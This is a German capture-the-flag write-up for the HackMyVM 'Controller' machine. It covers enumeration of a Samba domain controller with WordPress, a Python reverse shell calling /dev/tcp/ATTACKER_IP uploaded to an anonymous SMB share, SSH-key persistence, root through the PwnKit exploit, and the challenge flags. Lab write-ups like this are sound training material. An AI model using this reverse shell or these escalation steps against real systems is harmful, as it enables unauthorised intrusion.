# Controller - HackMyVM (Hard)

![Controller Icon](Controller.png)

## Übersicht

*   **VM:** Controller
*   **Plattform:** [HackMyVM](https://hackmyvm.eu/machines/machine.php?vm=Controller)
*   **Schwierigkeit:** Hard
*   **Autor der VM:** DarkSpirit
*   **Datum des Writeups:** 14. Oktober 2022
*   **Original-Writeup:** https://alientec1908.github.io/Controller_HackMyVM_Hard/
*   **Autor:** Ben C.

## Kurzbeschreibung

Die virtuelle Maschine "Controller" von HackMyVM (Schwierigkeitsgrad: Hard) wurde durch eine Reihe von Schritten kompromittiert. Die Enumeration offenbarte ein komplexes System, das als Samba Active Directory Domain Controller mit einem WordPress-Webserver konfiguriert war. Der initiale Zugriff erfolgte durch das Hochladen einer Python-Reverse-Shell-Payload auf einen anonym zugänglichen SMB-Share (`tester`), dessen Inhalt vermutlich durch einen unbekannten Mechanismus ausgeführt wurde. Dies führte zu einer Shell als Benutzer `tester`. Die Privilegienerweiterung zu Root wurde durch die Ausnutzung der bekannten PwnKit-Schwachstelle (CVE-2021-4034) in `pkexec` erreicht.

## Disclaimer / Wichtiger Hinweis

Die in diesem Writeup beschriebenen Techniken und Werkzeuge dienen ausschließlich zu Bildungszwecken im Rahmen von legalen Capture-The-Flag (CTF)-Wettbewerben und Penetrationstests auf Systemen, für die eine ausdrückliche Genehmigung vorliegt. Die Anwendung dieser Methoden auf Systeme ohne Erlaubnis ist illegal. Der Autor übernimmt keine Verantwortung für missbräuchliche Verwendung der hier geteilten Informationen. Handeln Sie stets ethisch und verantwortungsbewusst.

## Verwendete Tools

*   `netdiscover` (impliziert)
*   `arp-scan`
*   `nmap`
*   `vi`
*   `gobuster`
*   `enum4linux`
*   `smbclient`
*   `curl`
*   `wpscan`
*   `nikto`
*   `python` (für Payload-Erstellung und HTTP-Server)
*   `nc` (netcat)
*   `ssh`
*   `find`
*   PwnKit Exploit (CVE-2021-4034)
*   Standard Linux-Befehle (`ls`, `cat`, `mkdir`, `echo`, `chmod`, `id`, `cd`, `wget`)

## Lösungsweg (Zusammenfassung)

Der Angriff auf die Maschine "Controller" erfolgte in diesen Schritten:

1.  **Reconnaissance:**
    *   Ziel-IP (`192.168.2.149`, Hostname `controller.hmv`) via `netdiscover`/`arp-scan` identifiziert.
    *   `nmap` zeigte eine komplexe Konfiguration mit SSH (22), HTTP/HTTPS (80/443 - Apache mit WordPress 5.7.2), Kerberos (88), RPC (135), SMB (139/445 - Samba 4.6.2), LDAP (389/3268), LDAPS (636/3269) und Kpasswd (464). Anonyme LDAP-Bindungen waren möglich. SMB Message Signing war aktiv.
    *   WordPress-URLs leakten eine interne IP (`192.168.0.25`).

2.  **Web Enumeration (WordPress & Samba):**
    *   `gobuster` fand Standard-WordPress-Pfade.
    *   `enum4linux` identifizierte die Domäne `CONTROL` und einen benutzerdefinierten SMB-Share `tester`, der anonym zugänglich war.
    *   `wpscan` und `nikto` lieferten Standardinformationen, aber keine direkten Schwachstellen. Nikto hob ein browsbares `/wp-content/uploads/`-Verzeichnis hervor.

3.  **Initial Access (tester via SMB Payload):**
    *   Eine Python-Reverse-Shell-Payload wurde in einer Datei `test.txt` erstellt:
        `import commands\ncommands.getoutput('/bin/bash -c "/bin/bash -i >& /dev/tcp/ATTACKER_IP/5555 0>&1"')`
    *   Mittels `smbclient` wurde diese Datei anonym auf den `tester`-Share hochgeladen.
    *   Ein Netcat-Listener wurde auf Port 5555 gestartet.
    *   Die Ausführung der Payload (Mechanismus unklar, vermutlich ein Cronjob oder Dienst, der Dateien aus dem Share verarbeitet) führte zu einer Reverse Shell als Benutzer `tester`.
    *   Die User-Flag wurde aus `/home/webservices/user.txt` gelesen (Zugriff als `tester`).
    *   SSH-Zugriff als `tester` wurde durch Hinzufügen des eigenen öffentlichen Schlüssels zu `~/.ssh/authorized_keys` eingerichtet.

4.  **Privilege Escalation (tester -> root via PwnKit):**
    *   Das System wurde als Ubuntu 20.04.2 LTS identifiziert.
    *   Die Suche nach SUID-Binaries (`find / -perm -u=s ...`) zeigte `/usr/bin/pkexec`.
    *   Ein bekannter PwnKit-Exploit (CVE-2021-4034) wurde vom Angreifer-System heruntergeladen, per Python-HTTP-Server bereitgestellt und auf das Zielsystem als `tester` transferiert.
    *   Der Exploit wurde ausführbar gemacht (`chmod +x PwnKit`) und ausgeführt (`./PwnKit`).
    *   Dies führte direkt zu einer Root-Shell.
    *   Die Root-Flag wurde aus `/root/root.txt` gelesen.

## Wichtige Schwachstellen und Konzepte

*   **Anonymer SMB-Schreibzugriff:** Erlaubte das Hochladen einer Payload-Datei auf einen Share.
*   **Unsichere Ausführung von Share-Inhalten:** Ein (nicht näher spezifizierter) Mechanismus führte die hochgeladene Payload aus.
*   **Kernel/System-Schwachstelle (CVE-2021-4034 - PwnKit):** Ausnutzung einer lokalen Privilegieneskalations-Schwachstelle in `pkexec`.
*   **Informationslecks:** Preisgabe einer internen IP-Adresse durch WordPress.
*   **LDAP Anonymous Bind:** Hätte für weitere Enumeration genutzt werden können.
*   **Komplexe Dienstkonfiguration:** Die Kombination aus DC-Rollen und Webserver erhöhte die Angriffsfläche.

## Flags

*   **User Flag (`/home/webservices/user.txt`):** `K1ng0F3V4S10n`
*   **Root Flag (`/root/root.txt`):** `DpKg1sB3tt3rTh4nPyth0n?`

## Tags

`HackMyVM`, `Controller`, `Hard`, `SMB`, `Anonymous Write`, `Python Shell`, `PwnKit`, `CVE-2021-4034`, `pkexec`, `Privilege Escalation`, `WordPress`, `Samba AD DC`, `Linux`
